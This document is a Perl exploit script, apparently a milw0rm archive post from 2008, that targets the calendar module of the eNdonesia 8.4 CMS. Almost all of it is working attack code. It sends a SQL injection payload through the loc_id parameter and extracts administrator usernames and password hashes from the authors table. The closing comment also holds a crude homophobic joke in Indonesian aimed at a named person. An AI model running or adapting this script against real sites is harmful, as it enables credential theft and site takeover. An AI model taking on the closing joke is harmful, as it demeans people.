#!/usr/bin/perl
#/-----------------------------------------------\
#|  /-----------------------------------------\  |
#|  |  Remote SQL Exploit                     |  |
#|  |  eNdonesia 8.4 Remote SQL Exploit       |  |
#|  |  www.endonesia.org                      |  |
#|  |  Calendar Module                        |  |
#|  \-----------------------------------------/  |
#|  /-----------------------------------------\  |
#|  |  Presented By Jack                      |  |
#|  |  MainHack Enterprise                    |  |
#|  |  www.MainHack.com & irc.nob0dy.net      |  | 
#|  |  #MainHack #nob0dy #BaliemHackerlink    |  |
#|  |  Jack[at]MainHack[dot]com               |  |
#|  \-----------------------------------------/  |
#|  /-----------------------------------------\  |
#|  |  Hello To: Indonesian h4x0r             |  |
#|  |  yadoy666,n0c0py & okedeh               |  |
#|  |  VOP Crew [Vaksin13,OoN_BoY,Paman]      |  |
#|  |  NoGe,str0ke,H312Y,s3t4n,[S]hiro,frull  |  |
#|  |  all MainHack BrotherHood               |  |
#|  \-----------------------------------------/  |
#\-----------------------------------------------/
 
  use HTTP::Request;
  use LWP::UserAgent;

  $sql_vulnerable = "/mod.php?mod=calendar&op=list_events&loc_id=";
  $sql_injection  = "-999/**/union+select/**/0x3a,0x3a,concat(aid,0x3a,pwd),0x3a,concat(name,0x3a,pwd)/**/from/**/authors/*where%20name%20pwd";

  if(!@ARGV) { &help;exit(1);}

  sub help(){
       print "\n [?] eNdonesia 8.4 Remote SQL Exploit\n";
       print " [?] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
       print " [?] Use : perl $0 www.target.com\n";
       print " [?] Dont use \"http://\"\n";                                                                                    
       print " [?] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
       print " [?] Baliem Hacker - VOP crew - MainHack BrotherHood \n\n";
       print " [?] www.MainHack.com\n\n";
  }

  while (){
      my $target    = $ARGV[0];
       my $exploit   = "http://".$target.$sql_vulnerable.$sql_injection;
       print "\n [-] Trying to inject $target ...\n\n";
       my $request   = HTTP::Request->new(GET=>$exploit);
       my $useragent = LWP::UserAgent->new();
       $useragent->timeout(10);
       my $response   = $useragent->request($request);
       if ($response->is_success){
               my $res = $response->content;
               if ($res =~ m/\>([0-9,a-z]{2,13}):([0-9,a-f]{32})/g) {
                       my ($username,$passwd) = ($1,$2);
                       print " [target] $target \n";
                       print " [loginx] $username:$passwd \n\n";
                       exit(0);
               }
               else {
                       die " [error] Fail to get username and password.\n\n";
               }
       }
       else {
               die " [error] Fail to inject $target \n\n";
       }
  }

#/----------------------------------------------------------------\
#|  NoGay kalo kita artikan sepintas berarti Tidak ada Gay        |
#|  namun mari kita perhatikan secara seksama ...                 |
#|  NoGay merupakan kependekan dari NoGe is Gay.                  |
#|  Sungguh, penyembunyian sebuah karakter di balik makna kata.   |
#\----------------------------------------------------------------/
#Vendor Has been contacted and now working for it.

# milw0rm.com [2008-07-30]
